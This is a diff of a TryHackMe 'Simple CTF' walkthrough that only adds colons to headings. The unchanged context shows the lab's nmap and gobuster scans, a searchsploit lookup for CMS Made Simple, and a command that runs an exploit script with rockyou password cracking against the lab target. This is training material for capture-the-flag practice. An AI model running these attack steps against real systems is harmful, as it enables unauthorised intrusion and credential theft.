@@ -8,7 +8,7 @@ https://medium.com/@akerkar34/simple-ctf-tryhackme-walkthrough-13fae8abe32d
 
 
 ---
-#### nmap scan
+#### nmap scan:
 `nmap -sC -sV -A 10.10.90.196 -vv -oN nmap`
 
 ```
@@ -37,12 +37,12 @@ PORT     STATE SERVICE REASON  VERSION
 2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 ```
 
-#### gobuster hidden directory scan
+#### gobuster hidden directory scan:
 `gobuster dir -u http://10.10.90.196 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirb.txt`
 
 
 
-#### search for exploits
+#### search for exploits:
 
 `searchsploit cms made simple`
 
@@ -54,7 +54,7 @@ CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload
 ```
 
 
-#### run script on target
+#### run script on target:
 `/usr/bin/python2 exploit.py -u http://10.10.90.196 --crack -w /usr/share/wordlists/rockyou.txt`
 
 
